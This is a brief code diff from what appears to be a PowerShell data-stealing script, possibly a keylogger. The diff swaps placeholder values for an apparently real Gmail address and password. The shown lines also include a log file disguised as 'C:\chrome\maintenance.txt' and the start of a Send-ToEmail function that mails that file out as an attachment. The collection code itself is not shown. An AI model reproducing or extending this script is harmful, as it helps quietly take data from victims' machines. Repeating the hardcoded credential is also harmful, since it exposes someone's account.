@@ -1,5 +1,5 @@
-$Username = "YOUR GMAIL ADDRESS";
-$Password= "YOUR GMAIL PASSWORD";
+$Username = "markfrankjavier.1@gmail.com";
+$Password= "Toor1123";
 $path= "C:\chrome\maintenance.txt"
 
 function Send-ToEmail([string]$email, [string]$attachmentpath){
